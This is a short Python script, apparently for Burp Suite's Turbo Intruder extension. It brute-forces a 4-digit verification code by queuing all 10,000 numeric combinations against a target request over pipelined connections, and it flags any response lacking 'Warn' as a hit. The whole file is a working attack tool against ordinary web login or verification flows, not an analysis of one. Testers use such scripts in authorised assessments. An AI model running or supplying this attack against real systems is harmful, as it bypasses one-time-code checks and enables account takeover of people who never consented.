#Write by afei00123

from itertools import product
import string

def brute_veify_code(target, engine, length):
    #pattern = '1234567890'
    digits = string.digits
    for i in list(product(digits, repeat=length)):
        code =  ''.join(i)
        engine.queue(target.req, code)

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
            concurrentConnections=5,
            requestsPerConnection=30,
            pipeline=True
            )
    brute_veify_code(target, engine, 4)

def handleResponse(req, interesting):
# currently available attributes are req.status, req.wordcount, req.length and req.response
    #可根据响应内容进行判断
    if 'Warn' not in req.response:
        table.add(req)